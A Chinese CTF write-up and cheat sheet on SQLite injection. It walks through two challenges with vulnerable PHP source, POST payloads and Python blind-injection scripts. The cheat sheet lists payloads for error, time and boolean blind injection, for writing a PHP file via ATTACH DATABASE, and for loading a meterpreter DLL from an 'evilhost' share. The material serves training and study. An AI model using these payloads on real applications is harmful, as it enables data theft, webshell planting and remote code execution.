> 原文链接: https://www.anquanke.com//post/id/222625 


# CTF中的SQLite总结Cheat Sheet


                                阅读量   
                                **227367**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01eecc113853b09ecf.png)](https://p3.ssl.qhimg.com/t01eecc113853b09ecf.png)



## 0x01 前言

几次比赛都遇到了 SQLite 注入的题目，所以想来具体总结一下 SQLite 到底有哪些利用点，并整理出一张 Cheat Sheet。行文如有不当，还请师傅们在评论区留言捉虫，不甚感激。



## 0x02 初识

### <a class="reference-link" name="%E7%AE%80%E4%BB%8B"></a>简介

SQLite 是一个嵌入式 SQL 数据库引擎。与大多数其他 SQL 数据库不同，SQLite 没有独立的服务器进程。SQLite 直接读写普通磁盘文件。一个包含多个表、索引、触发器和视图的完整 SQL 数据库包含在一个磁盘文件中，但也因为轻型，所以不可避免的有一些安全隐患，比如数据库下载，有固定/默认数据库名/地址的问题，可下载造成安全威胁。

### <a class="reference-link" name="%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A4%E5%88%AB"></a>数据库判别

拿到一个环境首先做的应该是后端数据库的判别。

以下列出的是可供判别后端数据库的函数，在同一行并不意味着功能相同：

|MYSQL|SQLite
|------
|@[@version](https://github.com/version) / version()|sqlite_version()
|connection_id()|last_insert_rowid()
|last_insert_id()|strftime(‘%s’,’now’);
|row_count()|.
|crc32(‘MySQL’)|.
|BINARY_CHECKSUM(123)|.



## 0x03 题解

接下来通过两道题来理解 SQLite 的一些特性，方便我们后面总结 Cheat Sheet：

### <a class="reference-link" name="phpNantokaAdmin"></a>phpNantokaAdmin

路由 index、create、insert、delete ，功能对应显示、创建表、插入数据、删表。

先看有关 flag 的信息：

```
$pdo-&gt;query('CREATE TABLE `' . FLAG_TABLE . '` (`' . FLAG_COLUMN . '` TEXT);');
$pdo-&gt;query('INSERT INTO `' . FLAG_TABLE . '` VALUES ("' . FLAG . '");');
$pdo-&gt;query($sql);
```

这是源码中创建完用户自定义的表后，使用 config.php 中定义好了的 `FLAG_TABLE` 、`FLAG_COLUMN`、`FLAG` 三个常量创建表，作为我们的 `target` 。

```
$stmt = $pdo-&gt;query("SELECT name FROM sqlite_master WHERE type='table' AND name &lt;&gt; '" . FLAG_TABLE . "' LIMIT 1;");
```

当然，它不会就这么简单地显示在 index 页面中。

我们要做的就是通过自定义表利用可控变量达到注出 `FLAG_TABLE` 数据的目的。

index.php

```
$table_name = (string) $_POST['table_name'];
  $columns = $_POST['columns'];
  //sqlite 创建表语句 sqlite3 database_name.db
  $filename = bin2hex(random_bytes(16)) . '.db';
  $pdo = new PDO('sqlite:db/' . $filename);

  if (!is_valid($table_name)) `{`
    flash('Table name contains dangerous characters.');
  `}`
  if (strlen($table_name) &lt; 4 || 32 &lt; strlen($table_name)) `{`
    flash('Table name must be 4-32 characters.');
  `}`
  if (count($columns) &lt;= 0 || 10 &lt; count($columns)) `{`
    flash('Number of columns is up to 10.');
  `}`

  $sql = "CREATE TABLE `{`$table_name`}` (";
  $sql .= "dummy1 TEXT, dummy2 TEXT";
  for ($i = 0; $i &lt; count($columns); $i++) `{`
    $column = (string) ($columns[$i]['name'] ?? '');
    $type = (string) ($columns[$i]['type'] ?? '');

    if (!is_valid($column) || !is_valid($type)) `{`
      flash('Column name or type contains dangerous characters.');
    `}`
    if (strlen($column) &lt; 1 || 32 &lt; strlen($column) || strlen($type) &lt; 1 || 32 &lt; strlen($type)) `{`
      flash('Column name and type must be 1-32 characters.');
    `}`

    $sql .= ', ';
    $sql .= "`$column` $type";
  `}`
  $sql .= ');';
```

表名和列名、列属性都是我们可控的，SQL 语句拼接如下：

```
CREATE TABLE `{`$table_name`}` (dummy1 TEXT, dummy2 TEXT, `$column` $type);
```

utils.php waf

```
function is_valid($string) `{`
  $banword = [
    // comment out, calling function...
    "[\"#'()*,\\/\\\\`-]"
  ];
  $regexp = '/' . implode('|', $banword) . '/i';

  //正则表达式：/["#'()*,\/\\`-]/i
  if (preg_match($regexp, $string)) `{`
    return false;
  `}`
  return true;
```

要想绕过，首先介绍 SQLite 的几个特性：

> [SQLite Keywords](https://www.sqlite.org/lang_keywords.html)
SQLite 中使用关键字作为名称，有四种引用方法：
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014d3300dfb7c7fbcc.png)
括在方括号中的关键字是标识符。这不是标准的 SQL。MS access 和 SQL server 使用这种引用机制，SQLite 中包含这种引用机制是为了兼容。
[![](https://p0.ssl.qhimg.com/t0184b81676f6a68e41.png)](https://p0.ssl.qhimg.com/t0184b81676f6a68e41.png)
既然正则中所有引号都有匹配，我们可以使用 `[]` 括关键字进行绕过，并可用它来**注释**，代替 `--` 。
MYSQL 中有 information_schema 这样的系统表方便注入查询，而 SQLite 有无？
[sqlite_master](https://www.sqlite.org/schematab.html)
每个 SQLite 数据库都包含一个“模式表” ，用于存储该数据库的模式。数据库的模式是对数据库中包含的所有其他表、索引、触发器和视图的描述。模式表如下所示：
[![](https://p0.ssl.qhimg.com/t017747176c53d55d10.png)](https://p0.ssl.qhimg.com/t017747176c53d55d10.png)
其中 sql 字段的含义：
Sqlite _ schema.SQL 列存储描述对象的 SQL 文本。此 SQL 文本是 CREATE TABLE、 CREATE VIRTUAL TABLE、 CREATE INDEX、 CREATE VIEW 或 CREATE TRIGGER 语句，如果在数据库文件为数据库连接的主数据库时对其进行计算，则将重新创建该对象。**文本通常是用于创建对象的原始语句的副本。**
换而言之，我们可以通过查询 sqlite_master 中的 sql 知晓 `FLAG_TABLE` 创建时的语句，获取到其表名和列名。
综上，我们所要利用的有两张表，这就需要能操作两张表的，与 create table 有关的用法。
[CREATE TABLE … AS SELECT Statements](https://www.sqlite.org/lang_createtable.html)
“ CREATE TABLE… AS SELECT” 语句基于 SELECT 语句的结果创建并填充数据库表。该表的列数与 SELECT 语句返回的行数相同。每个列的名称与 SELECT 语句的结果集中相应列的名称相同。每个列的声明类型由 SELECT 语句结果集中相应表达式的表达式亲和类型确定。
使用 create table as 创建的表**最初由 SELECT 语句返回的数据行填充**。按照 SELECT 语句返回行的顺序，以连续升序的 rowid 值 (从1开始) 进行分配。

由上，也就是说，我们能这样构造语句：

```
CREATE TABLE landv as select sql [(dummy1 TEXT, dummy2 TEXT, `whatever you want` ] from sqlite_master;);
--前面说过，[] 可用作注释，也就是说，上面语句等价为
CREATE TABLE landv as select sql from sqlite_master;
--landv 这张由用户创建的表就会被 select 语句返回的数据行填充
```

payload1：

```
//路由 create 下 post
table_name=landv as select sql [&amp;columns[0][name]=abc&amp;columns[0][type]=] from sqlite_master;
```

[![](https://p1.ssl.qhimg.com/t0174268a528d73878d.png)](https://p1.ssl.qhimg.com/t0174268a528d73878d.png)

返回填充的第一行就是我们查出来的创建 `FLAG_TABLE` 的原始语句，同理，我们可以借此查出 flag 。

payload2：

```
//路由 create 下 post
table_name=landv as select flag_2a2d04c3 [&amp;columns[0][name]=abc&amp;columns[0][type]=] from flag_bf1811da;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0153aec2f79ec1a63a.png)

这道题主要是面向创表过程中可能的注入，但实际中运用得少（没有权限），接下来我们看整体。

### <a class="reference-link" name="Sqlite%20Voting"></a>Sqlite Voting

给了数据库文件和部分源码。

vote.php

```
&lt;?php
error_reporting(0);

if (isset($_GET['source'])) `{`
  show_source(__FILE__);
  exit();
`}`

// waf
function is_valid($str) `{`
  $banword = [
    // dangerous chars
    // " % ' * + / &lt; = &gt; \ _ ` ~ -
    "[\"%'*+\\/&lt;=&gt;\\\\_`~-]",
    // whitespace chars
    '\s',
    // dangerous functions
    'blob', 'load_extension', 'char', 'unicode',
    '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp',
    'in', 'limit', 'order', 'union', 'join'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) `{`
    return false;
  `}`
  return true;
`}`

header("Content-Type: text/json; charset=utf-8");

// check user input
if (!isset($_POST['id']) || empty($_POST['id'])) `{`
  die(json_encode(['error' =&gt; 'You must specify vote id']));
`}`
$id = $_POST['id'];
if (!is_valid($id)) `{`
  die(json_encode(['error' =&gt; 'Vote id contains dangerous chars']));
`}`

// N.B
// update database
$pdo = new PDO('sqlite:../db/vote.db');
$res = $pdo-&gt;query("UPDATE vote SET count = count + 1 WHERE id = $`{`id`}`");
if ($res === false) `{`
  die(json_encode(['error' =&gt; 'An error occurred while updating database']));
`}`

// succeeded!
echo json_encode([
  'message' =&gt; 'Thank you for your vote! The result will be published after the CTF finished.'
]);
```

schema.sql (actual flag is removed)

```
DROP TABLE IF EXISTS `vote`;
CREATE TABLE `vote` (
  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
  `name` TEXT NOT NULL,
  `count` INTEGER
);
INSERT INTO `vote` (`name`, `count`) VALUES
  ('dog', 0),
  ('cat', 0),
  ('zebra', 0),
  ('koala', 0);

DROP TABLE IF EXISTS `flag`;
CREATE TABLE `flag` (
  `flag` TEXT NOT NULL
);
INSERT INTO `flag` VALUES ('HarekazeCTF`{`&lt;redacted&gt;`}`');
```

过滤非常严格。

这道题的 SQL 语句是 update `vote` 表中的 `count` 自增，并且还会有更新是否成功的回显：

```
if ($res === false) `{`
  die(json_encode(['error' =&gt; 'An error occurred while updating database']));
`}`
```

从这基本可以确定是盲注了（从上面的 `banword` 也可以猜测），接下来我们需要的是故意使其报错，以便我们判断盲注是否正确。

**<a class="reference-link" name="%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%20SQLite%20%E7%9B%B2%E6%B3%A8"></a>基于错误的 SQLite 盲注**

<a class="reference-link" name="%E5%8F%AF%E4%BE%9B%E5%88%B6%E9%80%A0%E9%94%99%E8%AF%AF%E7%9A%84%E5%87%BD%E6%95%B0"></a>**可供制造错误的函数**

通过参考 [SQLite 官方手册的内置函数](https://www.sqlite.org/lang_corefunc.html)

我们找到了以下几个函数故意制造错误：

> `load_extension(x)`、`load_extension(x,y)`
`load_extension(x,y)` 函数使用入口点 y 从名为 x 的共享库文件中加载 SQLite 扩展。`load_extension ()` 的结果总是 NULL 。如果省略 y，则使用默认的入口点名称。如果扩展未能正确加载或初始化，则 `load _ extension()` 函数**引发异常**。
这个函数可以加载动态库，如 windows 的 dll ，linux 的 so ，换言之，我们可以利用其进行远程命令执行，这可以参考这篇 [利用这个函数反弹 shell](https://blog.csdn.net/qq_34101364/article/details/109250435) 的博客。
`abs(x)`
返回数值参数 x 的绝对值，如果 x 为 NULL，则 abs(x) 返回 NULL。如果 x 是不能转换为数值的字符串或 blob，则 Abs (x) 返回0.0 。如果 x 是整数 -922337203685475808，那么 abs (x) **抛出一个整数溢出错误**。
[![](https://p5.ssl.qhimg.com/t01622d14f8011425ef.png)](https://p5.ssl.qhimg.com/t01622d14f8011425ef.png)
0x8000000000000000 为 -922337203685475808 的十六进制形式。
`sum(x)`
返回一组中所有非空值的数值总和。如果所有输入都是整数或者 NULL，在结果溢出时，`sum(x)` 将抛出一个**“整数溢出”异常** 。
`ntile(n)`
参数 n 被作为整数处理。这个函数将分区尽可能平均地划分为 n 组，并按 ORDER BY 子句定义的顺序或其他任意顺序将1到 n 之间的整数分配给每个组。如果有必要，会首先出现更大的组。此函数返回分配给当前行所属组的整数值。同上也是整数溢出。

这里明显只能用整数溢出。

最朴素的盲注，是用 substr 和 ord 配合使用进行判断，但这里明显对其进行了限制，而且最重要的是，我们既不能用字符（引号被过滤），也不能用 ascii 码判断（ char 被过滤），那么我们到底要怎么才能判断每一位是否正确呢？

#### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E9%95%BF%E5%BA%A6%E5%8F%98%E5%8C%96%E7%9A%84%E7%9B%B2%E6%B3%A8"></a>利用长度变化的盲注

> 出题人 [st98 师傅](https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-350-sqlite-voting) 是利用 `replace` 来判断是否正确：
[replace(x,y,z)](https://www.sqlite.org/lang_corefunc.html#replace)
replace (x，y，z) 函数返回一个字符串，这个字符串是用字符串 z 替换字符串 x 中每个字符串 y 而形成的。BINARY 排序序列用于比较。如果 y 是一个空字符串，那么返回 x 不变。如果 z 最初不是字符串，则在处理之前将其强制转换为 UTF-8字符串。
简而言之，设 flag 为 `flag`{`landv01`}`` ，长度为 13 。
[![](https://p0.ssl.qhimg.com/t01dba2383592ffcb0b.png)](https://p0.ssl.qhimg.com/t01dba2383592ffcb0b.png)
长度变为了 9 ，是因 flag 中的 `flag` 四位被替换为空。
所以我们可以利用长度的变化来判断是否正确。
<hr>
下面是我对利用长度变化进行盲注的一些扩展：
实际上，我还找到了 `trim(x,y)` 企图达到与 `replace` 一样的效果：
[![](https://p3.ssl.qhimg.com/t01b443888640ee76df.png)](https://p3.ssl.qhimg.com/t01b443888640ee76df.png)
但当测试包含 ``{`` 时，`trim(x,y)` 的回显为什么却是 6 ？
[![](https://p2.ssl.qhimg.com/t01920760d32c558f2e.png)](https://p2.ssl.qhimg.com/t01920760d32c558f2e.png)
结合[官方文档](https://www.sqlite.org/lang_corefunc.html#trim)的解释，`trim(x,y)` 函数返回一个字符串，该字符串由删除 X **两端**出现在 Y 中的**任何和所有字符组成**。
如果省略了 Y 参数，`trim(x)` 将删除 X 两端的空格（这是最常用的用法）
也就是说，如果 y 是 `flag`{`` ，那么 `fla` 、`la` 这样的组合都会被删掉，所以并不能用于判断是否正确，虽说你可以一直寻找直至长度变化（ `ltrim()` 这里是删除 x 左端）：
[![](https://p5.ssl.qhimg.com/t018919d58a1bfd992e.png)](https://p5.ssl.qhimg.com/t018919d58a1bfd992e.png)
虽说在 SQLite `trim()` 不能很有效地判断，但在 [Oracle](https://docs.oracle.com/en/database/oracle/oracle-database/20/sqlrf/TRIM.html#GUID-00D5C77C-19B1-4894-828F-066746235B03) 中是可行的：
“如果您指定了 LEADING，那么 Oracle 数据库将删除所有等于 trim _ character 的前导字符。”
<pre><code class="lang-sql hljs">length(trim(leading 'f' from flag))
</code></pre>
上述语句可在 Oracle 中用于判断。

现在我们报错和判断正确的手段都有了，就要考虑特殊字符的绕过。

一堆限制，就用 hex 编码来进行绕过，因为一些比较的运算符都被 ban 了，我们利用位运算符代替：

以下脚本来自出题人师傅博客。

首先考虑 flag 长度的判断。

```
abs(case(length(hex((select(flag)from(flag))))&amp;`{`1&lt;&lt;n`}`)when(0)then(0)else(0x8000000000000000)end)
```

最外围我们用 `abs()` 抛出整数溢出的错误。

其中用 case 计算表达式，flag 长度与 ``{`1&lt;&lt;n`}`` 按位相与：

```
length(hex((select(flag)from(flag))))  &amp;  `{`1&lt;&lt;n`}`
```

``{`1&lt;&lt;n`}`` 也就是 2 的 n 次方，相与的作用只是为了把和 flag 长度（二进制）为 1 的部分记录下来，可想而知，一直从 1 循环到 n 为 16 ，我们把所有 1 都记录下来后，flag 的长度也就自然得出了。

```
# フラグの長さを特定
l = 0
i = 0
for j in range(16):
  r = requests.post(URL, data=`{`
    'id': f'abs(case(length(hex((select(flag)from(flag))))&amp;`{`1&lt;&lt;j`}`)when(0)then(0)else(0x8000000000000000)end)'
  `}`)
  if b'An error occurred' in r.content:
    l |= 1 &lt;&lt; j
print('[+] length:', l)
```

然后就是比对 hex 编码，0123456789 都能正常运用，但像 abcdef 就又要用到引号。

<a class="reference-link" name="%E8%A7%A3%E6%B3%95%E4%B8%80%20%E5%88%A9%E7%94%A8%20trim%20+%20hex%20%E5%88%A0%E9%99%A4%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6"></a>**解法一 利用 trim + hex 删除构造字符**

而上面我们不是提到 `trim()` 这个无差别，所有组合都会删除的函数吗，只要我们能构造出只有一个字母例如 A 的 hex 值，把全部数字删除，那不就得到 A 了吗？

如下，我们利用表中的数据和特殊函数的返回值来构造相应字符。

```
table = `{``}`
table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)' 
# 'zebra' → '7A65627261'
# trim 删除 1,2,5,6,7 后只剩下了 A ，以下同理
table['C'] = 'trim(hex(typeof(.1)),12567)' 
# 'real' → '7265616C'
table['D'] = 'trim(hex(0xffffffffffffffff),123)' 
# 0xffffffffffffffff = -1 → '2D31'
table['E'] = 'trim(hex(0.1),1230)' 
# 0.1 → 302E31
table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)' 
# 'dog' → '646F67'
table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||`{`table["C"]`}`||`{`table["F"]`}`)' 
# 'koala' → '6B6F616C61'
# || 是连接符，第二项的意思是 16||C||F ，也就是利用 trim 删除 1,6,C,F
```

接下来就是判断每一位字符了：

```
# フラグをゲット!

# 这里是已知 flag 格式为 HarekazeCTF`{` ，我们对其 hex 编码，接下来只需要盲注后面的字符
res = binascii.hexlify(b'HarekazeCTF`{`').decode().upper()
for i in range(len(res), l):
  for x in '0123456789ABCDEF':
    t = '||'.join(c if c in '0123456789' else table[c] for c in res + x)
    r = requests.post(URL, data=`{`
      'id': f'abs(case(replace(length(replace(hex((select(flag)from(flag))),`{`t`}`,trim(0,0))),`{`l`}`,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'
    `}`)
    if b'An error occurred' in r.content:
      res += x
      break
  print(f'[+] flag (`{`i`}`/`{`l`}`): `{`res`}`')
  i += 1
print('[+] flag:', binascii.unhexlify(res).decode())
```

`trim(0,0)` 实际上就是空，`l` 是 flag 的长度，`t` 是我们每次进行测试的字符串（如果有字符被确定了，就会被连接 `||` 进 `t` ）。

实际上，发送的请求是这样的：

```
abs(case(
replace(
length(replace(hex((select(flag)from(flag))),test_data,''))    # 这里进行替换和获取长度
,flag_length,'')                                               # 第二个 replace 判断长度是否变化
)when('')then(0)else(0x8000000000000000)end)
```

如果长度变化了就会报错，那么就是测试的字符是有的，被添加进 `res` ，再十六进制转字符就 getflag 了。

<a class="reference-link" name="%E8%A7%A3%E6%B3%95%E4%BA%8C%20%E5%8F%8C%E9%87%8D%20hex%20%E7%BC%96%E7%A0%81%E5%88%A0%E9%99%A4%E5%AD%97%E6%AF%8D"></a>**解法二 双重 hex 编码删除字母**

解法一是费了很大劲去构造出 abcdef 的，但我们可以直接双重编码，仅用数字来进行判断。

```
abs(ifnull(nullif(length((SELECT(flag)from(flag))),$LENGTH$),0x8000000000000000))
```

`ifnull` 返回两个参数中不为 0 的数，`nullif` 两个参数相同返回 NULL ，不同返回第一个参数。

换言之，以上 payload 在做的就是遍历 $LENGTH$ 找到与 flag 长度相等的数。

得到了长度，我们同样面临构造特数字符的问题，这里用了双重 hex 编码，编码后 flag 的长度即上面的 4 倍。

4 倍长度的 hex 纯数字编码会被用科学计数法表示，但我们可以用上面用到的 `||` 来进行连接，由这我们可以得到 payload：

```
abs(ifnull(nullif(max(hex(hex((SELECT(flag)from(flag)))),$NUMBER$),$NUMBER$),0x8000000000000000))
```

所以便可遍历 4 倍长度的 $NUMBER$ ，利用 `max` 得到双重编码后的 flag ，双重解码后即可。



# <a class="reference-link" name="0x04%20Cheat%20Sheet"></a>0x04 Cheat Sheet

下面结合题解直接来总结一张 Cheat Sheet，其中部分来源于外网部分来源于自我总结。<br>
因为表格 md 语法的问题，双竖线代替 || ：

|name|syntax|description
|------
|注释 1|—|
|注释 2|/**/|
|注释 3|[]|
|IF 语句|CASE WHEN|
|连接符|双竖线|
|截取子串|substr(x,y,z)|
|获取长度|length(stuff)|
|获取版本信息|select sqlite_version();|
|获取表名|SELECT tbl_name FROM sqlite_master;|
|获取列名|SELECT sql FROM sqlite_master;|
|基于错误的盲注 1|abs(case(xxx)when(xxx)then(0)else(0x8000000000000000)end)|判断字符，abs 可由 sum 、ntile 等函数替换，case 计算的表达式可用如 replace(length(replace(x,y,z)),y,z) 这样利用长度变化判断
|基于错误的盲注 2|abs(case(length(xxx)&amp;`{`1&lt;&lt;n`}`)when(0)then(0)else(0x8000000000000000)end)|获取长度，需要脚本配合，n：1~16
|基于错误的盲注 3|abs(ifnull(nullif(length((SELECT(flag)from(flag))),$LENGTH$),0x8000000000000000))|获取长度，通过遍历
|生成单引号 1|select cast(X’27’ as text);|
|生成单引号 2|select substr(quote(hex(0)),1,1);|quote：返回SQL文字的文本，该文本是其参数的值，适合包含在SQL语句中。字符串由**单引号**包围。
|生成双引号|select cast(X’22’ as text);|
|基于时间的盲注|1’ AND [RANDNUM]=LIKE(‘ABCDEFG’, UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))|供判断注入，RANDOMBLOB()函数生成指定长度的随机字符串。当这个长度足够大的时候就会让服务器产生明显的延迟。这样就可以判断语句的执行成功与否，这同时也是通用的注入 payload 。实际上，AND 后面的表达式计算出来是 0 。
|布尔盲注 1|and (SELECT count(tbl**name) FROM sqlite_master WHERE type=’table’ and tbl_name NOT like ‘sqlite**%’ ) &lt; number_of_table|获得表的个数
|布尔盲注 2|and (SELECT length(tbl**name) FROM sqlite_master WHERE type=’table’ and tbl_name not like ‘sqlite**%’ limit 1 offset 0)=table_name_length_number|列举表名
|布尔盲注 3|and (SELECT hex(substr(tbl**name,1,1)) FROM sqlite_master WHERE type=’table’ and tbl_name NOT like ‘sqlite**%’ limit 1 offset 0) &gt; hex(‘some_char’)|获得数据
|文件写入|1’;ATTACH DATABASE ‘/var/www/lol.php’ AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (‘’;—|需要堆叠查询对应配置开启
|代码执行|UNION SELECT 1,load_extension(‘\evilhost\evilshare\meterpreter.dll’,’DllMain’);—|具体使用可以看上面介绍给出的链接，默认情况下这个函数是禁用的。



## 0x05 参考

[https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet](https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet)

[https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
